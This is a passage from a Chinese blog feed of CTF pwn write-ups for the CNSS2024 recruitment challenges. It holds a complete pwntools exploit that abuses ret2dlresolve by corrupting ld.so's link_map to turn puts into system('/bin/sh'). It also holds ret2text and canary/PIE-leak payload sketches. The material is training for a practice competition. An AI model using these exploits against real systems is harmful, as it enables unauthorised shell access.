    <span class="n">myread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="k">do</span><span class="p">{</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
        <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">passwd</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="o">^=</span> <span class="n">value</span><span class="p">;</span>
    <span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">));</span>
    
    <span class="n">puts</span><span class="p">(</span><span class="n">passwd</span><span class="p">);</span>
    <span class="n">_Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="大致内容比较明确从passwd开始的位置可以8字节一组任意写前提是知道原本那个地址的内容是什么这道题比较难回显所以考虑ret2dlresolve想法是由于puts在最后才会第一次调用也就是那时会调用一次__dl_runtime_resolve来重定位puts另外的由于无法控制压栈的内容所以解释puts时的rel_arg和linkmap不能变所以放弃伪造linkmap由于mmap的空间在ld内存的低位而且偏移不变所以可以尝试修改到ld的内容改变linkmap内的内容实现误导__dl_runtime_resolve">   大致内容比较明确，从passwd开始的位置可以8字节一组任意写，前提是知道原本那个地址的内容是什么。<br/>   这道题比较难回显，所以考虑ret2dlresolve。想法是，由于<code class="language-plaintext highlighter-rouge">puts()</code>在最后才会第一次调用，也就是那时会调用一次<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>来重定位<code class="language-plaintext highlighter-rouge">puts</code>.<br/>   另外的，由于无法控制压栈的内容，所以解释<code class="language-plaintext highlighter-rouge">puts</code>时的<code class="language-plaintext highlighter-rouge">rel_arg</code>和<code class="language-plaintext highlighter-rouge">linkmap</code>不能变，所以放弃伪造<code class="language-plaintext highlighter-rouge">linkmap</code>。<br/>   由于mmap的空间在ld内存的低位，而且偏移不变，所以可以尝试修改到ld的内容，改变linkmap内的内容，实现误导<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>。</h5> <h5 id="首先查看一下linkmap的地址发现都在ld内重点修改的是执行文件的linkmap">   首先查看一下linkmap的地址，发现都在ld内，重点修改的是执行文件的linkmap</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">linkmap</span>
<span class="n">Node</span>           <span class="n">Objfile</span>                                                            <span class="n">Load</span> <span class="n">Bias</span>      <span class="n">Dynamic</span> <span class="n">Segment</span> 
<span class="mh">0x7ffff7ffe2e0</span> <span class="o">&lt;</span><span class="n">Unknown</span><span class="p">,</span> <span class="n">likely</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">worktable</span><span class="o">/</span><span class="n">cnss2024</span><span class="o">/</span><span class="n">boss</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">attachment</span><span class="o">&gt;</span> <span class="mh">0x555555554000</span> <span class="mh">0x555555557df8</span>  
<span class="mh">0x7ffff7ffe890</span> <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">1</span>                                                    <span class="mh">0x7ffff7fc1000</span> <span class="mh">0x7ffff7fc13a0</span>  
<span class="mh">0x7ffff7fbb160</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>                                    <span class="mh">0x7ffff7d83000</span> <span class="mh">0x7ffff7f9cbc0</span>  
<span class="mh">0x7ffff7ffdaf0</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>                                        <span class="mh">0x7ffff7fc3000</span> <span class="mh">0x7ffff7ffce80</span>  
</code></pre></div></div> <h5 id="思路是重定向时__dl_runtime_resolve会借助dynstr中的字符串在libc的linkmap中查找目标字符串的偏移这个偏移libc基址-被写到gotplt中所以这里实际上有两种方法第一种方法伪造一个dynstr使重定位查找到的不是puts而是system第二种方法修改linkmap中libc的基地址使gotplt中被写入我们指定的函数博主的方法是第一种方法并且使用docker容器作为环境但是这种方法在docker容器中直接运行可以getshelldocker容器把attachment挂到端口上打远程时就不行推测是直接运行的文件的内存布局和挂在端口上的不一样尝试爆破出两者的偏移结果也没用">   思路是，重定向时<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>会借助<code class="language-plaintext highlighter-rouge">.dynstr</code>中的字符串，在libc的linkmap中查找目标字符串的偏移，这个偏移+libc基址 被写到.got.plt中。所以这里实际上有两种方法，第一种方法，伪造一个.dynstr，使重定位查找到的不是<code class="language-plaintext highlighter-rouge">puts</code>，而是<code class="language-plaintext highlighter-rouge">system</code>；第二种方法，修改linkmap中libc的基地址，使.got.plt中被写入我们指定的函数。<br/>   博主的方法是第一种方法，并且使用docker容器作为环境，但是这种方法在docker容器中直接运行可以getshell，docker容器把attachment挂到端口上打远程时就不行，推测是直接运行的文件的内存布局和挂在端口上的不一样，尝试爆破出两者的偏移结果也没用。</h5> <h5 id="exppy仅供参考更具体的思路是将linkmap中的l-infodt_strtab修改最后一位lsb变为l-infodt_debug的地址dt_debug结构体的地址成员指向的是ldso中的一段可读写内存所以在这个位置的0x3eputs字符串在dynstr中的偏移偏移处伪造一个systemx00字样0x3e偏移处正好全是x00方便了工作">   exp.py仅供参考，更具体的思路是将linkmap中的<code class="language-plaintext highlighter-rouge">l-&gt;info[DT_STRTAB]</code>修改最后一位(LSB)，变为<code class="language-plaintext highlighter-rouge">l-&gt;info[DT_DEBUG]</code>的地址，DT_DEBUG结构体的地址成员指向的是ld.so中的一段可读写内存，所以在这个位置的0x3e（puts字符串在.dynstr中的偏移）偏移处伪造一个<code class="language-plaintext highlighter-rouge">system\x00</code>字样，0x3e偏移处正好全是<code class="language-plaintext highlighter-rouge">\x00</code>，方便了工作。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">os</span> <span class="kn">import</span> <span class="n">system</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
    <span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">gdb --pi={}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">pid</span><span class="p">))</span>
    <span class="c1">#system("gdb -q -ex 'target remote localhost:8000'")
</span>    <span class="nf">pause</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">key</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="n">crypto</span><span class="p">):</span> <span class="c1"># 目标比特串，原本的比特串
</span>    <span class="n">key</span> <span class="o">=</span> <span class="sh">''</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="n">temp</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">sh</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">crypto</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="n">key</span> <span class="o">+=</span> <span class="n">temp</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="n">ret</span> <span class="o">+=</span> <span class="nf">pow</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">xorsend</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

<span class="c1"># io = remote("152.136.11.155",10039)
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">8000</span><span class="p">)</span>
<span class="c1"># io = process("./boss/src/attachment")
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
<span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="c1"># passwd头部改成'sh\0'，绕过strncmp()
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">dea</span><span class="sh">'</span><span class="p">)))</span>
<span class="c1"># print(io.recvline())
# 修改l-&gt;info[DT_STRTAB]的LSB，指向l-&gt;info[DT_DEBUG]
</span><span class="n">of</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="o">*</span><span class="p">(</span><span class="o">-</span><span class="mi">6</span><span class="p">)</span>
<span class="n">offset1</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x7ffff7ffe348</span> <span class="o">-</span> <span class="mh">0x7ffff7fb9000</span> <span class="o">+</span> <span class="n">of</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span> <span class="c1"># 0x45348 0x4a348
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset1</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xb8</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x78</span><span class="sh">'</span><span class="p">)))</span>
<span class="c1"># 在0x3e处开始伪造system\x00字样
</span><span class="n">offset2</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x7ffff7ffe118</span> <span class="o">-</span> <span class="mh">0x7ffff7fb9000</span> <span class="o">+</span> <span class="n">of</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span> <span class="c1"># 0x45118 0x4a118
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset2</span> <span class="o">+</span> <span class="mi">7</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x73\x79</span><span class="sh">'</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">),</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>

<span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x73\x74\x65\x6d</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">),</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>
<span class="sh">'''</span><span class="s">
0x7f1e1f0f1148: 0x0000000000000000      0x7379000000000000
0x7f1e1f0f1158: 0x000000007374656d      0x0000000000000000
</span><span class="sh">'''</span>
<span class="c1"># 再把开头处改成'/bin/sh\0'，跳出循环
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="s">dbeef</span><span class="sh">'</span><span class="p">)))</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div> <h5 id="第二种方法是出题人迪普朋克提示的但没有想到怎么实现puts和system在libc中的偏移有16进制下的五位之多由于无法泄露libc基址异或最多修改三位所以不知道具体怎么写">   第二种方法是出题人迪普朋克提示的，但没有想到怎么实现，<code class="language-plaintext highlighter-rouge">puts</code>和<code class="language-plaintext highlighter-rouge">system()</code>在libc中的偏移有16进制下的五位之多，由于无法泄露libc基址，异或最多修改三位，所以不知道具体怎么写。</h5> <h5 id="补几天之后打通了远程发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样mmap分配的空间的位置不一样把上面exp的地址改一下就可以">   补：几天之后打通了远程，发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样，<code class="language-plaintext highlighter-rouge">mmap()</code>分配的空间的位置不一样，把上面exp的地址改一下就可以。</h5>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><summary type="html"><![CDATA[参考资料： 实例文件为boss题的attachment，见github https://zhuanlan.zhihu.com/p/37572651 https://ctf-wiki.org/executable/elf/structure/basic-info/ https://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/ https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc]]></summary></entry><entry><title type="html">CNSS2024 pwn 方向wp</title><link href="https://leakbox258.github.io/blog/2024/CNSS2024/" rel="alternate" type="text/html" title="CNSS2024 pwn 方向wp"/><published>2024-09-21T00:00:00+00:00</published><updated>2024-09-21T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/CNSS2024</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/CNSS2024/"><![CDATA[<h5 id="前排提示1一些题目没exp2由于题目不是一次上完的所以顺序上可能不完全与当时一致3附件在github仓库里有"><strong><em>前排提示：1.一些题目没exp<br/>       2.由于题目不是一次上完的，所以顺序上可能不完全与当时一致<br/>     3.附件在GitHub仓库里有</em></strong></h5> <h3 id="-引导之始baby">💓 引导之始(🍼Baby)</h3> <div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
即使引导早已破碎，也请您当上PWN高手。

nc 152.136.11.155 10030

💡 Hint
一头雾水？你可能需要阅读群文件-&gt;Bin Guideline
需要一点点命令行操作的知识
nc是什么？装个Linux吧
💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Orchid
</code></pre></div></div> <h5 id="你室的pwn每年都有的nc就送题">   你室的pwn每年都有的nc就送题</h5> <h3 id="-打地鼠baby">🫨 打地鼠(🍼Baby)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
打不到我，打不到我喵(/≧▽≦)/

nc 152.136.11.155 10031

💡 Hint
你不会真打算自己打吧
你可能需要Pwntool
💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Orchid
</code></pre></div></div> <h5 id="依然是你室每年都有的-io-题这题比上一年的-cnss娘中之人-简单一些这个题打就完了上一年的题还需要做分类和模式匹配个人观察来看很多人第三题做了也没有做这个第二题实际上这种-io-题完全不需要-pwn-知识只需要会用-pwntools-里的-io-工具即可究其原因第一ida反编译把大给吓坏了逻辑实现还是比较长的虽然不一定需要去看其次调-io-比较麻烦对于收发字符需要有比较精确的控制-其实pwn就是这样繁琐差错一个字节甚至一个位都不行io-题只是一切的开始喜欢的小伙伴千万不要放弃一点和本题相关的反编译得知玩家输出的地鼠代号是用-getchar-接收的而且只有一个-getchar所以在发送的时候不要使用-sendline否则多出来的-n-会在下一次打地鼠时被接收如果打过算法类竞赛肯定对此深有体会">   依然是你室每年都有的 IO 题，这题比上一年的 <strong><em>CNSS娘中之人</em></strong> 简单一些，这个题打就完了，上一年的题还需要做分类和模式匹配。<br/>   个人观察来看，很多人第三题做了也没有做这个第二题，实际上这种 IO 题完全不需要 pwn 知识，只需要会用 pwntools 里的 IO 工具即可。究其原因，第一IDA反编译把大🔥给吓坏了，逻辑实现还是比较长的（虽然不一定需要去看），其次调 IO 比较麻烦，对于收发字符需要有比较精确的控制 ，其实pwn就是这样繁琐，差错一个字节甚至一个位都不行，IO 题只是一切的开始，喜欢的小伙伴千万不要放弃。<br/>   一点和本题相关的，反编译得知玩家输出的地鼠代号是用 <code class="language-plaintext highlighter-rouge">getchar()</code> 接收的，而且只有一个 <code class="language-plaintext highlighter-rouge">getchar()</code>，所以在发送的时候不要使用 <code class="language-plaintext highlighter-rouge">.sendline()</code>，否则多出来的 <code class="language-plaintext highlighter-rouge">'\n'</code> 会在下一次打地鼠时被接收。如果打过算法类竞赛，肯定对此深有体会。</h5> <h3 id="-not-enougheasy">🥺 not enough(🐔Easy)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
快把shell给我！

nc 152.136.11.155 10032

💡 Hint
💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Orchid
</code></pre></div></div> <h5 id="这道题剥去了符号表但实际上也没太大影响核心代码只有一个main和一个手写的改进版read这个改进版read作用就是输入n时终止输入并把其改为0以截断字符串和scanfs差不多但是限制输入量这个改版read很常见并且一般漏洞点不会放在这里面查看12行发现字符串可以越界读写于是可以溢出到v4将其修改为0x114514然后就可以轻松-getshell">   这道题剥去了符号表，但实际上也没太大影响，核心代码只有一个<code class="language-plaintext highlighter-rouge">main()</code>和一个手写的改进版<code class="language-plaintext highlighter-rouge">read()</code>，这个改进版<code class="language-plaintext highlighter-rouge">read()</code>作用就是输入<code class="language-plaintext highlighter-rouge">'\n'</code>时终止输入，并把其改为<code class="language-plaintext highlighter-rouge">'\0'</code>，以截断字符串，和<code class="language-plaintext highlighter-rouge">scanf("%s")</code>差不多，但是限制输入量。这个改版<code class="language-plaintext highlighter-rouge">read()</code>很常见并且一般漏洞点不会放在这里面。<br/>   查看12行，发现字符串可以越界读写，于是可以溢出到<code class="language-plaintext highlighter-rouge">v4</code>，将其修改为<code class="language-plaintext highlighter-rouge">0x114514</code>，然后就可以轻松 <code class="language-plaintext highlighter-rouge">getshell()</code></h5> <h3 id="-were-safe-for-now-or-noteasy">😕 We’re safe… for now… or not?(🐔Easy)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
服务器出大锅啦，@XeAm正在紧急抢修系统，好不容易修好了。
这时，一个刻板印象的黑客大脸出现了，怎么回事？

明明程序main函数里面看起来没有异常，为什么出现了HACKED字样？

请将你的想法整理成PDF或markdown格式，发送到wwworchid39@gmail.com，我将根据你的答案给出flag

如果12小时内未回复请QQ联系。

💡 Hint
这是一个ELF程序，也就是说你需要Linux下运行
chmod +x pwn
动态调试会很管用
程序的callee是如何返回caller的？
💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Orchid
</code></pre></div></div> <h5 id="很简单复制字符串到目标栈地址上由于没有检查长度和canary导致了-previous-rbp-和-返回地址的最低一位-被覆盖而被覆盖后的地址指向了一个后门函数">   很简单，复制字符串到目标栈地址上，由于没有检查长度和canary，导致了 <strong><em>previous rbp</em></strong> 和 <strong><em>返回地址的最低一位</em></strong> 被覆盖，而被覆盖后的地址指向了一个后门函数。</h5> <h3 id="-im-the-moleeasy">😗 I’m the mole(🐔Easy)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
做完😕 We're safe... for now... or not?后，你终于知道漏洞在哪里了，此时你动了点小心思...

nc 152.136.11.155 10035

💡 Hint
结合之前学到的工具来做！
💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Orchid
</code></pre></div></div> <h5 id="也是保留项目-ret2text运用从上一题学到的栈溢出技术将返回地址修改为后门函数即可-getshell-值得注意的一点是众所周知64位的-system-要求栈地址16位对齐而不是平常的8位具体原因请移步nydn大佬的博客httpsnyyyddddngithubio20230926expe69cace59cb0e4b88de9809ae8bf9ce7a88be9809ae79a84e997aee9a298-涉及其中一个寄存器的问题招新pwn题所有涉及-ret2text-和-system的似乎本地远程都有这个栈平衡的问题对于此题来说最终的-rop-应该是下面这样的">   也是保留项目 <strong><em>ret2text</em></strong>，运用从上一题学到的栈溢出技术，将返回地址修改为后门函数即可 <code class="language-plaintext highlighter-rouge">getshell</code> 。<br/>   值得注意的一点是，众所周知，64位的 <code class="language-plaintext highlighter-rouge">system()</code> 要求栈地址16位对齐，而不是平常的8位（具体原因请移步nydn大佬的博客https://nyyyddddn.github.io/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/ ），涉及其中一个寄存器的问题。<br/>   招新pwn题所有涉及 <strong><em>ret2text</em></strong> 和 <code class="language-plaintext highlighter-rouge">system()</code>的，似乎本地远程都有这个栈平衡的问题，对于此题来说，最终的 <strong><em>ROP</em></strong> 应该是下面这样的。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="err">??????</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">))</span>
</code></pre></div></div> <h5 id="其他的题还有其他的方法之后会讲">   其他的题还有其他的方法，之后会讲。</h5> <h3 id="️-call-meeasy">☎️ Call Me……(🐔Easy)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
……Call Me……

不是，这电话也打不通啊？

🔗 题目地址
nc 152.136.11.155 10037

📃 题目附件
点我下载

💡 Hint
Canary
Pie
🚩 Flag格式
CNSS{meaningful_sentence}

🔨 暴打出题人
@Timlzh
</code></pre></div></div> <h5 id="可以感觉到tim出的题很温油后面的一道-heap-也是从这题开始要接触正儿八经的保护措施了这题主要是canary和piecanary金丝雀是栈溢出哨兵如果开启了它栈帧的-last-rbpebp-低一位字长的位置就会填写一字长的随机量然后程序就会在需要栈溢出检查的函数返回之前检查这个随机量如果发现这个量被修改当前函数不返回执行错误处理然后退出注意canary的最低位一定为x00起到截断输出的效果对write没用并且canary的值是全局变量在一个程序的生命周期中不变然后pie和aslr一样是地址随机化的保护技术区别在于aslr是操作系统实现的一般关不掉而且只随机堆栈和动态链接的部分pie是编译器实现的-gcc--no-pie-可以关掉pie可以将textbssdata-等地址也随机化让你打rop更难受不是最后无论怎么随机化都是以页为单位的也就是16进制的后三位不会变化地址之间的偏移也不会变化">   可以感觉到Tim出的题很温油，后面的一道 <strong><em>heap</em></strong> 也是。<br/>   从这题开始要接触正儿八经的保护措施了，这题主要是Canary和Pie。<br/>   Canary（金丝雀）是栈溢出哨兵，如果开启了它，栈帧的 <code class="language-plaintext highlighter-rouge">last rbp/ebp</code> 低一位字长的位置就会填写一字长的随机量，然后程序就会在需要栈溢出检查的函数返回之前检查这个随机量，如果发现这个量被修改，当前函数不返回，执行错误处理（然后退出）。<br/>   注意Canary的最低位一定为<code class="language-plaintext highlighter-rouge">'\x00'</code>，起到截断输出的效果（对<code class="language-plaintext highlighter-rouge">write()</code>没用），并且Canary的值是全局变量，在一个程序的生命周期中不变。<br/>   然后PIE，和ASLR一样是地址随机化的保护技术。区别在于ASLR是操作系统实现的，一般关不掉，而且只随机堆栈和动态链接的部分；PIE是编译器实现的 <code class="language-plaintext highlighter-rouge">gcc -no-pie</code> 可以关掉PIE，可以将<code class="language-plaintext highlighter-rouge">.text</code>、<code class="language-plaintext highlighter-rouge">.bss</code>、<code class="language-plaintext highlighter-rouge">.data</code> 等地址也随机化，让你打ROP更难受（不是）。最后，无论怎么随机化，都是以页为单位的，也就是16进制的后三位不会变化，地址之间的偏移也不会变化。</h5> <h5 id="这个题在输入正好11位的电话号码之前会一直循环打印输入的字符串考虑借此leak-pie-和-canary">   这个题在输入正好11位的电话号码之前，会一直循环打印输入的字符串，考虑借此leak pie 和 canary。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># leak canary
</span><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="err">????</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="c1"># 溢出到canary最低位的\x00，便于输出时带出canary
# leak pie
</span><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="err">!!!!</span><span class="p">)</span> <span class="c1"># 正好完全覆盖last_rbp即可
# ret2backdoor
</span><span class="n">payload3</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="err">$$$$</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_rbp</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">backdoor</span> <span class="o">+</span> <span class="n">pie_base</span><span class="p">)</span>
</code></pre></div></div> <h5 id="然后还是system-栈平衡的问题可以向上面一样在-rop-中加入-p64ret--pie_base也可以返回到backdoor-中实际调用-system-的位置由于少了最开头的压栈操作从此处开始调用确实是16位对齐的">   然后还是<code class="language-plaintext highlighter-rouge">system()</code> 栈平衡的问题，可以向上面一样，在 ROP 中加入 <code class="language-plaintext highlighter-rouge">p64(ret + pie_base)</code>，也可以返回到<code class="language-plaintext highlighter-rouge">backdoor()</code> 中实际调用 <code class="language-plaintext highlighter-rouge">system()</code> 的位置，由于少了最开头的压栈操作，从此处开始调用确实是16位对齐的。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">public</span> <span class="n">bug</span>
<span class="n">bug</span> <span class="n">proc</span> <span class="n">near</span>
<span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
<span class="n">endbr64</span>
<span class="n">push</span>    <span class="n">rbp</span>
<span class="n">mov</span>     <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="n">lea</span>     <span class="n">rax</span><span class="p">,</span> <span class="n">command</span>    <span class="p">;</span> <span class="s">"/bin/sh"</span>  <span class="o">&lt;----------</span><span class="err">直接</span><span class="n">ret</span><span class="err">到这个位置</span>
<span class="n">mov</span>     <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>        <span class="p">;</span> <span class="n">command</span>
<span class="n">call</span>    <span class="n">_system</span>
<span class="n">mov</span>     <span class="n">edi</span><span class="p">,</span> <span class="mi">0</span>          <span class="p">;</span> <span class="n">status</span>
<span class="n">call</span>    <span class="n">_exit</span>
<span class="p">;</span> <span class="p">}</span> <span class="c1">// starts at 128D</span>
<span class="n">bug</span> <span class="n">endp</span>
</code></pre></div></div> <h3 id="-happy-sugar-lifemid">🐦‍⬛ happy sugar life(🤖Mid)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
潮水褪去，在阳光下剥落出的白色晶胞
尝之，口感咸鲜回甘

据传是对付羽兽的宝物
吸食一粒即会毙命

幽暗森林里的歌声回响
祂是光明、也是救赎
亦不知将被尖锐的血色吞没

